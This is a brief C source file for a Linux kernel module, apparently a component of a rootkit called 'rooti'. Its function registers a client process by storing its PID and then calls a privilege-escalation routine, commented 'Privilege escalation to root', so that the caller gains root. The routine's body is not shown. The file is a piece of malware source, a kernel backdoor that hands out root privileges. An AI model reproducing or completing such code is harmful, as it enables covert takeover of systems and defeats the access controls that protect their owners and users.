#include <linux/module.h>
#include <linux/string.h>
#include "privilege.h"
#include "client.h"

/*
    Registers a new client user process.
*/
int rooti_register_client(struct rooti_client *client)
{
    // Initialize client process
    client->pid = current->pid;

    // Privilege escalation to root
    return rooti_elevate_privilege();
}